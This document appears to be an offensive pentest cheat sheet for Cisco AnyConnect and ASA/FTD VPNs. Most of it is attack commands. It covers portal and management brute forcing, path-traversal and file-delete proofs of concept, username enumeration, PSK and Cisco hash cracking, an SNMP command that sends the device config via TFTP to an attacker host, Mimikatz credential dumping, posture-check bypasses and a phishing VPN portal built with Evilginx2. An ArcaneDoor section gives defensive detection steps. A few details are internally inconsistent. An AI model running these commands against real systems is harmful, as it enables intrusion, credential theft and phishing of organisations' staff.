# Cisco AnyConnect / ASA SSL VPN

## What is it?
Cisco AnyConnect Secure Mobility Client — SSL VPN solution backed by Cisco ASA (Adaptive Security Appliance) or FTD (Firepower Threat Defense). Widely deployed in enterprise for remote access. Attack surface includes the ASA management interface, SSL VPN portal, and the AnyConnect client itself.

---

## Ports

| Port | Protocol | Service |
|------|----------|---------|
| 443 | TCP | SSL VPN portal / AnyConnect |
| 8443 | TCP | Alternate SSL VPN portal |
| 4443 | TCP | Alternate ASDM / management |
| 500 | UDP | IKEv1/IKEv2 (IPsec) |
| 4500 | UDP | IPsec NAT-T |
| 443 | UDP | DTLS (AnyConnect over UDP) |

---

## Key Files / Paths

```
# ASA config
show running-config
show version
show crypto ca certificates

# AnyConnect client profiles (Windows)
C:\ProgramData\Cisco\Cisco AnyConnect Secure Mobility Client\Profile\*.xml
C:\Users\<user>\AppData\Local\Cisco\Cisco AnyConnect Secure Mobility Client\

# AnyConnect client profiles (Linux/macOS)
/opt/cisco/anyconnect/profile/*.xml
~/.cisco/certificates/ca/

# ASA VPN session DB
show vpn-sessiondb anyconnect
show vpn-sessiondb detail anyconnect
```

---

## Enumeration

```bash
# Banner / version grab
curl -sk https://<target>/+CSCOE+/logon.html | grep -i 'version\|cisco\|asa'
curl -sk https://<target>/CACHE/stc/1/index.html

# Check if ASDM accessible
curl -sk https://<target>/admin/public/index.html -o /dev/null -w "%{http_code}"

# Nmap service detection
nmap -sV -p 443,8443,4443 --script ssl-cert,ssl-enum-ciphers <target>

# Check WebVPN portal
curl -sk https://<target>/+webvpn+/index.html
curl -sk https://<target>/+CSCOE+/sess_update.html

# Shodan dork
ssl:"Cisco AnyConnect" http.title:"SSL VPN"
```

---

## ASA Management Interface

```bash
# ASDM brute force (HTTP Basic over HTTPS)
hydra -l admin -P /usr/share/wordlists/rockyou.txt <target> https-get /admin/public/index.html

# SSH to ASA management
ssh admin@<target>
# Default creds: admin/admin, cisco/cisco, enable password: cisco

# Enable mode
enable
<enable password>

# Once in — dump config
show running-config
show running-config | grep password
show running-config | grep tunnel-group
show running-config | grep group-policy
```

---

## SSL VPN Portal Attacks

```bash
# Credential brute force via portal POST
# Standard AnyConnect auth endpoint:
curl -sk -X POST https://<target>/+webvpn+/index.html \
  -d "tgroup=&next=&tgcookieset=&username=admin&password=admin&Login=Login"

# Hydra against webform
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  <target> https-post-form \
  "/+CSCOE+/logon.html:username=^USER^&password=^PASS^&Login=Login:Login failed"

# Check for CLIENTLESS bookmark traversal (unauthenticated path traversal)
curl -sk "https://<target>/+CSCOE+/files/usr/share/doc/"
```

---

## CVEs

| CVE | Description | Impact |
|-----|-------------|--------|
| CVE-2020-3153 | AnyConnect Windows client path traversal — arbitrary file copy as SYSTEM | Local PrivEsc |
| CVE-2020-3556 | AnyConnect IPC channel manipulation — execute arbitrary scripts | Local Code Exec |
| CVE-2021-1585 | AnyConnect DLL hijacking via insecure search path | Local PrivEsc |
| CVE-2023-20178 | AnyConnect Windows privilege escalation via symlink attack | Local PrivEsc |
| CVE-2018-0296 | ASA path traversal — read files without auth | Pre-auth Info Disc |
| CVE-2020-3187 | ASA WebVPN directory traversal — delete/read files | Pre-auth File Read |
| CVE-2022-20713 | ASA clientless SSL VPN XSS | Session Hijack |
| CVE-2023-20269 | ASA/FTD brute force — enumerate valid usernames without lockout | Credential Enum |

---

## CVE-2018-0296 — ASA Path Traversal (Pre-auth)

```bash
# Read /etc/passwd without authentication
curl -sk "https://<target>/+CSCOU+/../+CSCOE+/files/usr/share/doc/OpenSSL/openssl.txt" \
  --path-as-is

# PoC — confirm vulnerable via /+CSCOU+/ traversal
curl -sk "https://<target>/+CSCOU+/../+CSCOE+/files/etc/passwd" --path-as-is

# Check for session token leak
curl -sk "https://<target>/+CSCOE+/session.html" \
  -H "Cookie: webvpnlogin=1; webvpnLang=en"
```

---

## CVE-2020-3187 — ASA WebVPN File Delete/Read

```bash
# Delete a file (PoC — use with care)
curl -sk -X DELETE "https://<target>/+CSCOE+/portal.html" \
  -H "Cookie: webvpnlogin=1"

# File read via traversal
curl -sk "https://<target>/+CSCOU+/../+CSCOE+/files/tmp/.+CSCOE+/session" \
  --path-as-is
```

---

## AnyConnect Client Profile Extraction

Profile XML files store server addresses, authentication settings, and can reveal internal infrastructure.

```bash
# Windows — locate profile files
dir "C:\ProgramData\Cisco\Cisco AnyConnect Secure Mobility Client\Profile\" /s
type "C:\ProgramData\Cisco\Cisco AnyConnect Secure Mobility Client\Profile\vpn_profile.xml"

# Look for:
# <HostAddress> — VPN server FQDNs/IPs (internal naming)
# <Authentication> — certificate vs password
# <ServerList> — all configured VPN gateways
# <AlwaysOn> — if true, split-tunnel is likely disabled
# <BypassDownloader> — misconfig that skips profile updates

# Linux
cat /opt/cisco/anyconnect/profile/*.xml
```

---

## Client-Side Attacks (Post-Phish / Physical Access)

```bash
# CVE-2020-3153 — path traversal as SYSTEM (Windows)
# AnyConnect moves files during update — plant DLL/exe in update path
# Exploit: create symlink in temp dir before AnyConnect processes update

# CVE-2021-1585 — DLL hijacking
# AnyConnect loads DLLs from PATH-searchable locations
# Plant malicious DLL in a writable PATH directory:
# wkscli.dll, samlib.dll, netutils.dll

# CVE-2023-20178 — symlink attack
# Vulnerable: AnyConnect 4.10.x before 4.10.06079
# Creates files in C:\Windows\System32\ via temp directory symlink
# PoC: https://github.com/Wh04m1001/CVE-2023-20178

# Check installed version
reg query "HKLM\SOFTWARE\Cisco\Cisco AnyConnect Secure Mobility Client" /v Version
# or
"C:\Program Files (x86)\Cisco\Cisco AnyConnect Secure Mobility Client\vpnui.exe" --version
```

---

## Tunnel Group / Group Policy Enumeration

```bash
# Enumerate valid group names via portal (no auth needed — groups shown in dropdown)
curl -sk https://<target>/+CSCOE+/logon.html | grep -i 'group\|tunnel'

# With valid creds — enumerate from ASA CLI
show running-config tunnel-group
show running-config group-policy

# Key config weaknesses:
# - split-tunneling enabled (bypass corporate monitoring)
# - no posture check / hostscan (connect from any device)
# - password-only auth with no MFA
# - tunnel-group with preshared key visible in config
```

---

## Credential Storage

```bash
# AnyConnect stores credentials (Windows) — DPAPI encrypted
# Location:
dir "%APPDATA%\Cisco\Cisco AnyConnect Secure Mobility Client\"
# VPN credentials in credential store — extractable with Mimikatz DPAPI module

# Mimikatz — dump AnyConnect saved creds
privilege::debug
sekurlsa::dpapi
# Then decode blob with dpapi::cred /in:<blob>

# Alternatively — check Windows Credential Manager
cmdkey /list | findstr /i cisco
```

---

## Post-Exploitation (VPN Access)

```bash
# Once connected — discover internal network
ip route show          # split-tunnel routes pushed by ASA
cat /etc/resolv.conf   # internal DNS servers pushed by ASA
nmcli connection show  # tunnel interface details

# Internal DNS resolution reveals target scope
host -l <internal-domain> <dns-server>
nmap -sn <pushed-subnet>/24

# ASA pushes route info in CSTP (Cisco SSL Tunnel Protocol) — inspect headers
curl -sk https://<target>/CACHE/stc/1/index.html -v 2>&1 | grep -i 'X-CSTP'
```

---

## Dangerous Configurations

| Config | Risk |
|--------|------|
| No certificate pinning on client | MITM AnyConnect connections |
| `split-tunnel` enabled | Users route non-VPN traffic outside corporate monitoring |
| `password-only` auth, no MFA | Credential stuffing viable |
| `no tunnel-group lock` | Any group accessible from portal |
| ASDM accessible from internet | Brute force management interface |
| `hostscan` not enforced | Unmanaged devices can connect |
| ASA version < 9.16 | Multiple critical CVEs unpatched |

---

---

## ArcaneDoor — 2024 Nation-State Zero-Days (CVE-2024-20353 / CVE-2024-20359 / CVE-2024-20358)

> [!note]
> Disclosed April 2024. Attributed to state-sponsored actor (UAT4356 / Storm-1849). Targeted perimeter ASA/FTD devices globally. Two zero-days chained — no auth required.

| CVE | Description | Impact |
|-----|-------------|--------|
| CVE-2024-20353 | ASA/FTD management+data plane DoS — forced reload via malformed HTTPS | Pre-auth DoS / persistence trigger |
| CVE-2024-20359 | ASA persistent local code execution — malicious VPN client file survives reload | Pre-auth persistent RCE |
| CVE-2024-20358 | ASA/FTD CLI command injection via crafted backup file | Authenticated RCE |

**Line Dancer** — in-memory implant (shellcode interpreter) delivered via CVE-2024-20359. Survives reboots. Provides arbitrary shellcode execution, disables syslog, captures/exfils passing traffic.

**Line Runner** — persistence mechanism using pre-change event hooks (`client-update` functionality). Survives `write erase` + reload.

```bash
# Detect indicators — check for:
# 1. Unexpected files in flash that persist across reload
show flash:
dir flash:

# 2. Unexpected enable_1.bin / client update packages
show version
dir disk0:

# 3. Check for crashinfo anomalies
show crashinfo

# 4. Unexpected HTTPS connections on management interface
show logging | include HTTPS
show conn | include 443

# 5. Unexpected process / memory anomalies (FTD)
show processes | include <unknown>

# Cisco-provided detection script (checks for Line Dancer artifacts)
# https://github.com/ciscoAS/arcaneDetector

# Patch — affected versions (upgrade required):
# ASA: 9.12.x < 9.12.4.29, 9.14.x < 9.14.4.14, 9.16.x < 9.16.4.19, 9.17.x < 9.17.1.13, 9.18.x < 9.18.3.39
# FTD: 6.4.x < 6.4.0.16, 6.6.x < 6.6.7.1, 7.0.x < 7.0.5.1, 7.2.x < 7.2.3, 7.3.x < 7.3.1.1

# Check current ASA version
show version | include Software Version
```

---

## IKEv1 / IKEv2 Enumeration (IPsec VPN)

```bash
# Install ike-scan
apt install ike-scan -y

# Probe for IKEv1 support (main mode)
ike-scan <target>

# IKEv1 aggressive mode — enumerates valid group names
# Group name is the pre-shared key identifier (tunnel-group name)
ike-scan --aggressive --id=<group-name> <target>

# Brute force group names with ike-scan
for group in vpn users remote ssl admin employees; do
  result=$(ike-scan --aggressive --id=$group <target> 2>/dev/null)
  echo "$group: $result" | grep -i "handshake\|SA\|valid"
done

# Check IKEv2 support
ike-scan --ikev2 <target>

# Once valid group found — crack PSK with ikecrack or psk-crack
# IKEv1 aggressive mode leaks a hash that can be cracked offline
ike-scan --aggressive --id=<group> <target> --pskcrack=hash.txt
psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt

# nmap IKE scripts
nmap -sU -p 500 --script ike-version <target>

# Enumerate transform sets (encryption/hash algorithms)
ike-scan --trans=5,2,1,2 <target>   # 3DES, SHA1, DH2
ike-scan --trans=7/256,2,1,2 <target>  # AES-256, SHA1, DH2
```

---

## ASA Config Password Cracking

ASA/IOS configs contain passwords in several formats — Type 7 is trivially reversible.

```bash
# --- Type 7 (XOR obfuscation — NOT encryption) ---
# Appears as: password 7 <hash>  OR  key 7 <hash>
# Example: enable password 7 094F471A1A0A

# Decode with ciscot7
pip install ciscot7
ciscot7 094F471A1A0A

# Or with Python one-liner
python3 -c "
h='094F471A1A0A'
xlat=[0x64,0x73,0x66,0x64,0x3B,0x6B,0x66,0x6F,0x41,0x2C,0x2E,0x69,0x79,0x65,0x77,0x72,0x6B,0x6C,0x64,0x4A,0x4B,0x44,0x48,0x53,0x55,0x42]
seed=int(h[:2])
print(''.join(chr(int(h[i:i+2],16)^xlat[(seed+i//2-1)%26]) for i in range(2,len(h),2)))
"

# Online: https://www.ifm.net.nz/cookbooks/passwordcracker.html

# --- Type 5 (MD5 — enable secret) ---
# Appears as: enable secret 5 $1$mERr$hx5rVt7rPNoS4wqbXKX7m0
# hashcat mode 500 (md5crypt)
hashcat -m 500 '$1$mERr$hx5rVt7rPNoS4wqbXKX7m0' /usr/share/wordlists/rockyou.txt

# --- Type 8 (PBKDF2-SHA256) ---
# Appears as: enable secret 8 $8$dsYGNam3K1SIJO$7nv/35M/qr6t.dVc7ULvsNgGfL0...
# hashcat mode 9200
hashcat -m 9200 '$8$<hash>' /usr/share/wordlists/rockyou.txt

# --- Type 9 (scrypt) ---
# Appears as: enable secret 9 $9$nhEmQVczB7dqsO$X.HsgL6x1il0RxkOSSvyQYwucySCt7qFm4v7pqCxkuM
# hashcat mode 9300
hashcat -m 9300 '$9$<hash>' /usr/share/wordlists/rockyou.txt --force

# Extract password hashes from a dumped ASA config
grep -E 'password [0-9]|secret [0-9]' running-config.txt
```

---

## SNMP Enumeration & Config Dump

```bash
# Check SNMP is responding
nmap -sU -p 161 --script snmp-info <target>

# Community string brute force
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <target>

# Walk the ASA SNMP tree (v2c)
snmpwalk -v 2c -c public <target>
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.1   # system info

# ASA-specific OIDs
snmpwalk -v 2c -c public <target> 1.3.6.1.4.1.9.9.23   # Cisco IP-IF
snmpget -v 2c -c public <target> 1.3.6.1.2.1.1.5.0     # sysName (hostname)
snmpget -v 2c -c public <target> 1.3.6.1.2.1.1.1.0     # sysDescr (version info)

# SNMP v3 — enumerate users (noauth first)
snmpwalk -v 3 -u admin -l noAuthNoPriv <target>

# If write community known — dump running config via TFTP
# From ASA CLI (or via SNMP write OID):
copy running-config tftp://<attacker-ip>/asa-config.txt

# SNMP write → TFTP config copy OID (Cisco SNMP copy MIB)
snmpset -v 2c -c private <target>   1.3.6.1.4.1.9.9.96.1.1.1.1.2.1 i 1   1.3.6.1.4.1.9.9.96.1.1.1.1.3.1 i 4   1.3.6.1.4.1.9.9.96.1.1.1.1.4.1 i 1   1.3.6.1.4.1.9.9.96.1.1.1.1.5.1 i 1   1.3.6.1.4.1.9.9.96.1.1.1.1.7.1 s "<attacker-ip>"   1.3.6.1.4.1.9.9.96.1.1.1.1.8.1 s "asa-config.txt"   1.3.6.1.4.1.9.9.96.1.1.1.1.14.1 i 1
```

---

## Username Enumeration (CVE-2023-20269)

```bash
# CVE-2023-20269 — ASA/FTD allows unlimited brute force against SSL VPN
# with different response behavior for valid vs invalid usernames

# Valid username → "Authentication failed" or MFA prompt
# Invalid username → "Login failed" immediately

# Manual check
curl -sk -X POST "https://<target>/+webvpn+/index.html"   -d "username=admin&password=wrongpassword&Login=Login" | grep -i "failed\|error\|invalid"

# Automate username enumeration
while read user; do
  resp=$(curl -sk -X POST "https://<target>/+webvpn+/index.html"     -d "username=$user&password=badpassword&Login=Login")
  if echo "$resp" | grep -q "Authentication failed"; then
    echo "[VALID] $user"
  fi
done < /usr/share/seclists/Usernames/Names/names.txt

# Note: Cisco patched lockout in later versions but response differentiation persists
# Spray valid usernames with common passwords (no lockout in vulnerable versions)
```

---

## Group-URL / Group Alias Enumeration

```bash
# Tunnel groups can have a URL alias — accessible directly without portal dropdown
# Format: https://<target>/<group-alias>

# Common aliases to check
for alias in vpn remote ssl anyconnect users employees admin corp guest; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://<target>/$alias")
  echo "$alias: $code"
done

# The login page for a specific group reveals the tunnel-group name
curl -sk "https://<target>/employees" | grep -i 'tunnel\|group\|tgroup'

# Direct POST to specific group (bypasses group selection dropdown)
curl -sk -X POST "https://<target>/+webvpn+/index.html"   -d "tgroup=employees&username=admin&password=Password1&Login=Login"

# Enumerate from portal — groups exposed in HTML source or JS
curl -sk "https://<target>/+CSCOE+/logon.html" | grep -oP 'tunnel_group[^"]*|tgroup[^"]*'
```

---

## HostScan / Posture Check Bypass

HostScan runs on the connecting client to verify endpoint compliance (AV, OS version, patch level, registry keys). Several bypass approaches:

```bash
# 1. Spoof HostScan HTTP headers
# AnyConnect sends assessment results in X-CSTP headers
curl -sk -X POST "https://<target>/+webvpn+/index.html"   -H "X-CSTP-Hostname: CORP-PC-001"   -H "X-CSTP-OS: Windows 10"   -H "X-AnyConnect-Identifier: AnyConnect Windows 4.10.06090"   -d "username=<user>&password=<pass>&Login=Login"

# 2. Use older AnyConnect version that lacks HostScan enforcement
# Some ASA configs enforce HostScan only if client reports support

# 3. Spoof required registry keys (Windows — local machine, requires admin)
# If policy checks: HKLM\SOFTWARE\Symantec\... for AV
reg add "HKLM\SOFTWARE\Symantec\Symantec Endpoint Protection\CurrentVersion" /v "PRODUCTVERSION" /d "14.3.0.0" /f

# 4. Use DAP (Dynamic Access Policy) probe response — check what HostScan looks for
# From ASA CLI (with creds):
show running-config dynamic-access-policy-record
# See what attributes are evaluated (antivirus, os, patch level, registry)

# 5. VM with matching profile
# Clone a legitimate compliant machine OS template in a VM
# HostScan reads OS version, AV registry keys, file presence
```

---

## Always-On VPN / Trusted Network Detection Bypass

```bash
# Always-On prevents VPN disconnect — blocks internet if VPN not connected
# TND allows bypass when on "trusted" corporate network (by DNS probe)

# Inspect AnyConnect profile for TND config:
grep -A5 -i 'TrustedNetwork\|AlwaysOn\|TND'   "C:\ProgramData\Cisco\Cisco AnyConnect Secure Mobility Client\Profile\*.xml"

# TND works by probing a URL — if trusted DNS resolves it, VPN not forced
# <TrustedDNSDomains>corp.local</TrustedDNSDomains>
# <TrustedDNSServers>10.1.1.1</TrustedDNSServers>
# <TrustedHTTPSServerList><ServerName>trustedcheck.corp.local</ServerName>

# Bypass — spoof trusted DNS response (if you control DNS on local network)
# Set local DNS to resolve trusted domain → TND probe succeeds → Always-On disabled

# Or: modify hosts file (requires local admin)
echo "10.0.0.1 trustedcheck.corp.local" >> C:\Windows\System32\drivers\etc\hosts

# Kill switch check — what happens if VPN drops?
# Check profile: <CaptivePortalRemediation> — if true, captive portal is allowed
grep -i 'CaptivePortal\|FailOpen\|FailClose' /opt/cisco/anyconnect/profile/*.xml
```

---

## ASA CLI Deep Dive (Post-Auth)

```bash
# --- Version / Hardware ---
show version
show inventory                        # hardware model, serial numbers
show module                           # installed modules (IPS, CX, etc.)

# --- Auth / AAA ---
show running-config aaa               # AAA server config (reveals AD/RADIUS servers)
show aaa-server                       # authentication servers + health
show aaa-server protocol ldap         # LDAP server details (IP, base DN, bind user)
show aaa-server <group> host <ip>     # specific server stats + bind failures

# --- VPN Sessions ---
show vpn-sessiondb anyconnect         # active AnyConnect sessions (username, IP, duration)
show vpn-sessiondb detail anyconnect  # full session detail including group policy applied
show vpn-sessiondb l2l                # site-to-site VPN sessions
show vpn-sessiondb summary            # session count by type

# --- Network Mapping ---
show conn                             # active connections through ASA
show conn count                       # connection counts
show nat                              # NAT rules (reveals internal subnets)
show route                            # routing table (internal network topology)
show interface                        # interface IPs, inside/outside designation

# --- Firewall Rules ---
show access-list                      # all ACLs
show running-config access-list       # full ACL config
show running-config access-group      # which ACL applied to which interface
packet-tracer input outside tcp <src-ip> 12345 <dst-ip> 443 detail  # simulate traffic

# --- Crypto / Certs ---
show crypto ca certificates           # installed certificates (expiry, CN, issuer)
show crypto key mypubkey rsa          # RSA key pairs
show crypto ipsec sa                  # IPsec security associations
show crypto isakmp sa                 # IKE security associations

# --- Logs / Events ---
show logging                          # syslog config + recent logs
show logging message                  # what messages are logged
show threat-detection statistics      # IDS stats (attack attempts)
show asp drop                         # dropped packets (firewall hits)

# --- LDAP Bind Creds (high value) ---
show running-config | grep ldap-login-password   # LDAP bind password in cleartext
# or
show running-config aaa-server | grep ldap-login
```

---

## Fake AnyConnect Portal (Credential Harvesting)

```bash
# Deploy a phishing VPN portal to harvest credentials
# Works well with spear-phish → "Your VPN cert expired, login again"

# Option 1 — Evilginx2 (reverse proxy, captures real session tokens too)
# Create phishlet for AnyConnect portal
evilginx2
phishlets hostname anyconnect vpn.corp-update.com
phishlets enable anyconnect
lures create anyconnect
lures get-url <id>

# Option 2 — Simple Flask clone of AnyConnect portal
# Clone the portal HTML:
wget -r -np -k "https://<legit-target>/+CSCOE+/logon.html" -P ./portal-clone/

# Capture and forward creds:
# Flask: log POST body, redirect to real portal with 302

# Option 3 — GoPhish + cloned portal
# Point GoPhish landing page to cloned /+CSCOE+/logon.html
# Capture: username, password, tgroup (tunnel group reveals internal naming)

# Option 4 — AnyConnect profile push MiTM
# If you can intercept profile updates (DNS poison + rogue server):
# Serve modified profile.xml with your server as <HostAddress>
# Users connect to your server instead → harvest creds at TLS layer
# Requires valid cert or cert pinning bypass

# What the captured POST contains:
# username=<victim>&password=<cred>&tgroup=<tunnel-group>&Login=Login
# tgroup reveals internal group names / naming conventions
```

---

## FTD (Firepower Threat Defense) Specifics

```bash
# FTD uses a different management model — Firepower Management Center (FMC) or FDM
# FDM (Firepower Device Manager) — local REST API

# FDM REST API (replaces ASDM on FTD)
curl -sk -X POST "https://<target>/api/fdm/latest/fdm/token"   -H "Content-Type: application/json"   -d '{"grant_type":"password","username":"admin","password":"Admin123"}'

# Store token
FDM_TOKEN=$(curl -sk -X POST "https://<target>/api/fdm/latest/fdm/token"   -H "Content-Type: application/json"   -d '{"grant_type":"password","username":"admin","password":"Admin123"}' | jq -r '.access_token')

# Enumerate via FDM API
curl -sk -H "Authorization: Bearer $FDM_TOKEN"   "https://<target>/api/fdm/latest/devices/default/routing/virtualrouters/default/staticroutes"

curl -sk -H "Authorization: Bearer $FDM_TOKEN"   "https://<target>/api/fdm/latest/object/networks"

# FMC REST API (centralized management — if FMC exposed)
curl -sk -X POST "https://<fmc>/api/fmc_platform/v1/auth/generatetoken"   -H "Content-Type: application/json"   --user "admin:Admin123" -I | grep -i 'X-auth-access-token\|X-auth-refresh-token'

# FTD diagnostic CLI (expert mode) — Linux shell under the hood
# SSH to FTD → expert → sudo su
# Access FTD Linux filesystem directly
expert
sudo su -
```

## Quick Reference

```bash
# Version/banner grab
curl -sk https://<target>/+CSCOE+/logon.html | grep -i version

# CVE-2018-0296 path traversal check
curl -sk --path-as-is "https://<target>/+CSCOU+/../+CSCOE+/files/etc/passwd"

# Brute force portal
hydra -l admin -P rockyou.txt <target> https-post-form "/+CSCOE+/logon.html:username=^USER^&password=^PASS^:Login failed"

# Enumerate tunnel groups from portal
curl -sk https://<target>/+CSCOE+/logon.html | grep -i tunnel

# ASA CLI (if creds obtained)
ssh admin@<target>
show running-config
show vpn-sessiondb anyconnect
```
